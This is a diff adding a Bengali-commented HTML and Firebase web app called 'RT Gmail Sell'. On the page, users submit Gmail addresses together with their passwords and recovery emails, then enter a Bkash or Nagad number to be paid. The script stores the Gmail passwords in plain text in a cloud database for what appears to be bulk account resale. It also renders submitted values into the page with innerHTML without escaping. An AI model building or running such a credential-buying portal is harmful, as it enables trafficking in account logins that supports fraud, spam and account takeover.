@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RT Gmail Sell</title>
+    <style>
+        /* আপনার CSS কোড অপরিবর্তিত আছে */
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');@keyframes gradient-animation{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}@keyframes fade-in{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Poppins',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(-45deg,#0f0c29,#302b63,#24243e);background-size:400% 400%;animation:gradient-animation 15s ease infinite;padding:20px;color:#f0f0f0}.app-container{width:100%;max-width:500px;background:rgba(255,255,255,0.08);backdrop-filter:blur(10px);border-radius:20px;padding:30px 40px;border:1px solid rgba(255,255,255,0.18);box-shadow:0 8px 32px 0 rgba(0,0,0,0.37)}header{display:flex;justify-content:space-between;align-items:center;margin-bottom:25px}header h1{text-align:center;font-weight:600;font-size:2em;text-shadow:2px 2px 4px rgba(0,0,0,0.2)}.form-group{margin-bottom:20px;position:relative}.form-group label{display:block;margin-bottom:8px;font-weight:400;color:#ddd}.form-group input,.form-group select{width:100%;padding:12px 15px;background:rgba(0,0,0,0.2);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;font-size:1rem;transition:all 0.3s ease}.form-group input::placeholder{color:#aaa}.form-group input:focus,.form-group select:focus{outline:none;border-color:#8A2BE2;box-shadow:0 0 15px rgba(138,43,226,0.5)}.payment-section{margin-top:25px;padding-top:20px;border-top:1px solid rgba(255,255,255,0.2)}.number-input-group{display:flex;gap:10px}.number-input-group input{flex-grow:1}.btn{width:100%;padding:15px;border:none;border-radius:8px;font-size:1.1rem;font-weight:600;cursor:pointer;transition:all 0.3s ease;color:#fff}.btn-primary{background:linear-gradient(90deg,#8A2BE2,#4B0082);margin-top:10px}.btn-primary:hover{box-shadow:0 0 20px rgba(138,43,226,0.7);transform:translateY(-2px)}.btn-secondary{background:#00bfff;width:auto;padding:12px 20px}.btn-secondary:hover{background:#009acd;box-shadow:0 0 15px rgba(0,191,255,0.6)}.list-container{margin-top:30px}.list-container h2{text-align:center;margin-bottom:15px;font-weight:500}#submitted-list{list-style:none;max-height:250px;overflow-y:auto;padding-right:10px}#submitted-list::-webkit-scrollbar{width:8px}#submitted-list::-webkit-scrollbar-track{background:rgba(0,0,0,0.2);border-radius:4px}#submitted-list::-webkit-scrollbar-thumb{background:#8A2BE2;border-radius:4px}#submitted-list::-webkit-scrollbar-thumb:hover{background:#6a1eae}.list-item{background:rgba(255,255,255,0.1);padding:15px;border-radius:8px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:flex-start;border-left:4px solid #8A2BE2;animation:fade-in 0.5s ease}.list-item .emails{font-size:0.9rem;word-break:break-all;margin-right:10px}.list-item .timestamp{font-size:0.8rem;color:#ccc;white-space:nowrap}.status-info{text-align:right}.status-badge{padding:4px 10px;border-radius:12px;font-size:0.75rem;font-weight:500;color:#fff;margin-top:8px;min-width:70px;display:inline-block;text-align:center}.status-pending{background-color:#f39c12}.status-success{background-color:#2ecc71}.status-reject{background-color:#e74c3c}.list-item .timestamp{margin-bottom:0}
+        .header-controls{display:flex;align-items:center;gap:15px}.menu-container{position:relative}.menu-btn{background:none;border:none;cursor:pointer;padding:5px}.menu-btn svg{width:28px;height:28px;fill:#f0f0f0;transition:fill 0.2s ease}.menu-btn:hover svg{fill:#8A2BE2}.user-menu{display:none;position:absolute;top:calc(100% + 10px);right:0;width:220px;background:rgba(36,36,62,0.95);backdrop-filter:blur(10px);border-radius:10px;border:1px solid rgba(255,255,255,0.18);padding:15px;box-shadow:0 4px 20px rgba(0,0,0,0.3);z-index:100}.user-menu.show{display:block;animation:fade-in 0.3s ease}.user-menu p{font-size:0.9rem;color:#ddd;margin-bottom:10px;text-align:left}.uid-wrapper{display:flex;align-items:center;justify-content:space-between;background:rgba(0,0,0,0.3);padding:8px 12px;border-radius:6px}.uid-wrapper span{font-family:monospace;font-size:1.1rem;font-weight:600;color:#2ecc71}.copy-btn{background:none;border:1px solid #00bfff;color:#00bfff;padding:5px 10px;border-radius:5px;cursor:pointer;font-size:0.8rem;transition:all 0.2s ease}.copy-btn:hover{background:#00bfff;color:#fff}
+    </style>
+    
+    <!-- Firebase SDK Scripts -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    
+</head>
+<body>
+    <!-- HTML অংশ অপরিবর্তিত আছে -->
+    <div id="auth-container">
+        <div class="app-container">
+            <header> <h1 id="auth-title">Login</h1> </header>
+            <main>
+                <form id="login-form">
+                    <div class="form-group"><label for="login-email">Email</label><input type="email" id="login-email" placeholder="Enter your email" required></div>
+                    <div class="form-group"><label for="login-password">Password</label><input type="password" id="login-password" placeholder="Enter your password" required></div>
+                    <button type="submit" class="btn btn-primary">Login</button>
+                </form>
+                <p style="text-align: center; margin-top: 15px;"> Don't have an account? <a href="#" id="show-signup" style="color: #00bfff;">Sign Up</a> </p>
+                <form id="signup-form" style="display: none;">
+                    <div class="form-group"><label for="signup-email">Email</label><input type="email" id="signup-email" placeholder="Enter your email" required></div>
+                    <div class="form-group"><label for="signup-password">Password</label><input type="password" id="signup-password" placeholder="Create a password (min. 6 characters)" required></div>
+                    <button type="submit" class="btn btn-primary">Sign Up</button>
+                </form>
+                <p style="text-align: center; margin-top: 15px; display: none;" id="login-link-container"> Already have an account? <a href="#" id="show-login" style="color: #00bfff;">Login</a> </p>
+            </main>
+        </div>
+    </div>
+    <div id="app-content" style="display: none;">
+        <div class="app-container">
+            <header>
+                <h1>RT Gmail Sell</h1>
+                <div class="header-controls">
+                    <div class="menu-container">
+                        <button id="menu-btn" class="menu-btn">
+                            <svg viewBox="0 0 100 80" width="40" height="40"><rect width="100" height="15" rx="8"></rect><rect y="30" width="100" height="15" rx="8"></rect><rect y="60" width="100" height="15" rx="8"></rect></svg>
+                        </button>
+                        <div id="user-menu" class="user-menu">
+                            <p>Your Unique ID:</p>
+                            <div class="uid-wrapper">
+                                <span id="user-short-uid">Loading...</span>
+                                <button id="copy-uid-btn" class="copy-btn">Copy</button>
+                            </div>
+                        </div>
+                    </div>
+                    <button id="logout-btn" class="btn btn-secondary" style="padding: 10px 15px; font-size: 0.9rem;">Logout</button>
+                </div>
+            </header>
+            <main>
+                <form id="gmail-form">
+                    <div class="form-group"><label for="gmail1">Gmail</label><input type="email" id="gmail1" placeholder="Enter Gmail" required></div>
+                    <div class="form-group"><label for="password">Password</label><input type="password" id="password" placeholder="Enter Gmail Password" required></div>
+                    <div class="form-group"><label for="recovery-gmail">Recovery Gmail</label><input type="email" id="recovery-gmail" placeholder="Recovery Gmail" required></div>
+                    <button type="submit" class="btn btn-primary">Submit Now</button>
+                </form>
+                <div class="payment-section">
+                    <div class="form-group"><label for="payment-method">Payment Method</label><select id="payment-method"><option value="bkash">Bkash</option><option value="nagad">Nagad</option></select></div>
+                    <div class="form-group"><label for="number-now">Number Now</label><div class="number-input-group"><input type="tel" id="number-now" placeholder="Your Payment Number"><button type="button" id="send-now-btn" class="btn btn-secondary">Send Now</button></div></div>
+                </div>
+                <div class="list-container" id="list-section" style="display: none;">
+                    <h2>Submitted List</h2>
+                    <ul id="submitted-list"></ul>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyALz0NOPG7L_k2siIYWxfjcY8bMNpxpowQ",
+            authDomain: "rt--sell.firebaseapp.com",
+            databaseURL: "https://rt--sell-default-rtdb.firebaseio.com",
+            projectId: "rt--sell",
+            storageBucket: "rt--sell.appspot.com",
+            messagingSenderId: "62514195865",
+            appId: "1:62514195865:web:fe54c659c4e863514d3708",
+            measurementId: "G-XHKN9FRQKP"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const database = firebase.database();
+        
+        // *** প্রধান পরিবর্তনগুলো এখানে করা হয়েছে ***
+
+        let currentUserId = null; // বর্তমান ব্যবহারকারীর আইডি রাখার জন্য ভেরিয়েবল
+        let submissionsRef = null; // Firebase listener রেফারেন্স রাখার জন্য
+        let lastSubmissionId = null;
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // সকল DOM এলিমেন্টগুলো এখানে একবারই নেওয়া হচ্ছে
+            const authContainer = document.getElementById('auth-container');
+            const appContent = document.getElementById('app-content');
+            const loginForm = document.getElementById('login-form');
+            const signupForm = document.getElementById('signup-form');
+            const showSignup = document.getElementById('show-signup');
+            const showLogin = document.getElementById('show-login');
+            const loginLinkContainer = document.getElementById('login-link-container');
+            const authTitle = document.getElementById('auth-title');
+            
+            const logoutBtn = document.getElementById('logout-btn');
+            const gmailForm = document.getElementById('gmail-form');
+            const sendNowBtn = document.getElementById('send-now-btn');
+            const submittedList = document.getElementById('submitted-list');
+            const listSection = document.getElementById('list-section');
+            
+            const menuBtn = document.getElementById('menu-btn');
+            const userMenu = document.getElementById('user-menu');
+            const userShortUidSpan = document.getElementById('user-short-uid');
+            const copyUidBtn = document.getElementById('copy-uid-btn');
+
+            // --- Authentication UI Logic (অপরিবর্তিত) ---
+            showSignup.addEventListener('click', (e) => { e.preventDefault(); loginForm.style.display = 'none'; showSignup.parentElement.style.display = 'none'; signupForm.style.display = 'block'; loginLinkContainer.style.display = 'block'; authTitle.innerText = 'Sign Up'; });
+            showLogin.addEventListener('click', (e) => { e.preventDefault(); signupForm.style.display = 'none'; loginLinkContainer.style.display = 'none'; loginForm.style.display = 'block'; showSignup.parentElement.style.display = 'block'; authTitle.innerText = 'Login'; });
+
+            // --- Authentication Actions ---
+            signupForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const email = document.getElementById('signup-email').value;
+                const password = document.getElementById('signup-password').value;
+                auth.createUserWithEmailAndPassword(email, password)
+                    .then(userCredential => {
+                        const user = userCredential.user;
+                        const shortUid = user.uid.substring(0, 6);
+                        return database.ref('users/' + user.uid).set({
+                            email: user.email,
+                            createdAt: new Date().toISOString(),
+                            shortUid: shortUid
+                        });
+                    })
+                    .then(() => {
+                        alert('Sign up successful! Please log in.');
+                        signupForm.reset();
+                        showLogin.click();
+                    })
+                    .catch(error => alert(error.message));
+            });
+
+            loginForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const email = document.getElementById('login-email').value;
+                const password = document.getElementById('login-password').value;
+                auth.signInWithEmailAndPassword(email, password).catch(error => alert(error.message));
+            });
+
+            logoutBtn.addEventListener('click', () => auth.signOut());
+
+            // --- Main Application Logic ---
+
+            // Gmail ফর্ম সাবমিট করার জন্য লিসেনার
+            gmailForm.addEventListener('submit', function(event) {
+                event.preventDefault();
+                if (!currentUserId) { // ব্যবহারকারী লগইন করা না থাকলে সাবমিট হবে না
+                    alert('Please log in to submit.');
+                    return;
+                }
+                const gmail1 = document.getElementById('gmail1').value.trim();
+                const password = document.getElementById('password').value.trim();
+                const recoveryGmail = document.getElementById('recovery-gmail').value.trim();
+                if (!gmail1 || !password || !recoveryGmail) {
+                    alert('Please fill in all boxes');
+                    return;
+                }
+                const submissionData = { gmail: gmail1, password: password, recovery: recoveryGmail, timestamp: new Date().toISOString(), status: 'pending', payment: null, userId: currentUserId };
+                const newSubmissionRef = database.ref('submissions/' + currentUserId).push();
+                newSubmissionRef.set(submissionData)
+                    .then(() => {
+                        alert('Your submission was successful!');
+                        gmailForm.reset();
+                        lastSubmissionId = newSubmissionRef.key;
+                    })
+                    .catch((error) => {
+                        console.error("Error submitting data: ", error);
+                        alert('There was an error.');
+                    });
+            });
+
+            // পেমেন্ট পাঠানোর জন্য লিসেনার
+            sendNowBtn.addEventListener('click', function() {
+                if (!currentUserId) {
+                    alert('Please log in first.');
+                    return;
+                }
+                if (!lastSubmissionId) {
+                    alert('Please submit your Gmail account first.');
+                    return;
+                }
+                const paymentMethod = document.getElementById('payment-method').value;
+                const paymentNumber = document.getElementById('number-now').value.trim();
+                if (!paymentNumber) {
+                    alert('Enter Your Payment Number');
+                    return;
+                }
+                const paymentData = { method: paymentMethod, number: paymentNumber };
+                database.ref(`submissions/${currentUserId}/${lastSubmissionId}/payment`).set(paymentData)
+                    .then(() => {
+                        alert(`Payment request successful!`);
+                        document.getElementById('number-now').value = '';
+                        lastSubmissionId = null;
+                    })
+                    .catch(error => {
+                        console.error("Payment info error:", error);
+                        alert("Could not send payment info.");
+                    });
+            });
+
+            // --- Auth State Change Handler ---
+            // ব্যবহারকারীর লগইন বা লগআউট অবস্থা পর্যবেক্ষণ করে
+            auth.onAuthStateChanged(user => {
+                if (user) {
+                    // ব্যবহারকারী লগইন করলে
+                    currentUserId = user.uid;
+                    authContainer.style.display = 'none';
+                    appContent.style.display = 'block';
+
+                    // ইউজারের shortUid ডাটাবেস থেকে নিয়ে আসা
+                    database.ref('users/' + user.uid).get().then((snapshot) => {
+                        if (snapshot.exists()) {
+                            userShortUidSpan.textContent = snapshot.val().shortUid || 'N/A';
+                        } else {
+                            userShortUidSpan.textContent = user.uid.substring(0, 6);
+                        }
+                    });
+                    
+                    // তার সাবমিশনগুলো শোনার জন্য লিসেনার চালু করা
+                    listenForSubmissions(user.uid);
+
+                } else {
+                    // ব্যবহারকারী লগআউট করলে
+                    currentUserId = null;
+                    authContainer.style.display = 'block';
+                    appContent.style.display = 'none';
+                    userMenu.classList.remove('show');
+                    
+                    // সাবমিশন শোনার লিসেনার বন্ধ করা
+                    if (submissionsRef) {
+                        submissionsRef.off();
+                    }
+                    submittedList.innerHTML = ''; // লিস্ট খালি করে দেওয়া
+                }
+            });
+
+            // --- Helper Functions ---
+
+            // এই ফাংশনটি নির্দিষ্ট ইউজারের জন্য ডাটাবেস থেকে সাবমিশন আনে
+            function listenForSubmissions(userId) {
+                if (submissionsRef) {
+                    submissionsRef.off(); // আগের কোনো লিসেনার থাকলে বন্ধ করা
+                }
+                submissionsRef = database.ref('submissions/' + userId);
+                submissionsRef.orderByChild('timestamp').on('value', (snapshot) => {
+                    submittedList.innerHTML = ''; // প্রতিবার আপডেটের আগে লিস্ট খালি করা
+                    if (snapshot.exists()) {
+                        listSection.style.display = 'block';
+                        let submissionsArray = [];
+                        snapshot.forEach((childSnapshot) => {
+                            submissionsArray.push(childSnapshot.val());
+                        });
+                        // নতুন সাবমিশনগুলো উপরে দেখানোর জন্য রিভার্স করা
+                        submissionsArray.reverse().forEach(data => createAndDisplayListItem(data));
+                    } else {
+                        listSection.style.display = 'none';
+                    }
+                });
+            }
+
+            // এই ফাংশনটি প্রতিটি সাবমিশনের জন্য HTML আইটেম তৈরি করে
+            function createAndDisplayListItem(data) {
+                const timeString = new Date(data.timestamp).toLocaleTimeString('bn-BD');
+                let statusClass = data.status === 'success' ? 'status-success' : (data.status === 'reject' ? 'status-reject' : 'status-pending');
+                let statusText = data.status.charAt(0).toUpperCase() + data.status.slice(1);
+                const listItem = document.createElement('li');
+                listItem.className = 'list-item';
+                listItem.innerHTML = `<div class="emails"><strong>Gmail:</strong> ${data.gmail}<br><strong>Recovery:</strong> ${data.recovery}</div><div class="status-info"><div class="timestamp">${timeString}</div><div class="status-badge ${statusClass}">${statusText}</div></div>`;
+                submittedList.appendChild(listItem); // .prepend এর বদলে .appendChild ব্যবহার করে 순서 ঠিক রাখা
+            }
+
+            // --- Menu and Copy Logic (অপরিবর্তিত) ---
+            menuBtn.addEventListener('click', (e) => { e.stopPropagation(); userMenu.classList.toggle('show'); });
+            window.addEventListener('click', () => { if(userMenu.classList.contains('show')) { userMenu.classList.remove('show'); } });
+            copyUidBtn.addEventListener('click', () => {
+                const uidToCopy = userShortUidSpan.textContent;
+                navigator.clipboard.writeText(uidToCopy).then(() => {
+                    copyUidBtn.textContent = 'Copied!';
+                    setTimeout(() => { copyUidBtn.textContent = 'Copy'; }, 2000);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
